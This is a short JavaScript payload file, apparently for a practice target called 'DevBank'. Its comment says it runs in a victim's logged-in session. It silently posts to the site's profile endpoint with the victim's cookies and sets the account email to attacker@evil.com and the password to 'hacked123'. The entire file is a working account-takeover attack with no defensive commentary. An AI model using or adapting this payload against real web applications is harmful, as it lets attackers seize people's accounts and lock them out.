// payload.js - runs in the victim's logged-in DevBank session
fetch("/profile", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "email=attacker@evil.com&password=hacked123",
    credentials: "include"
});
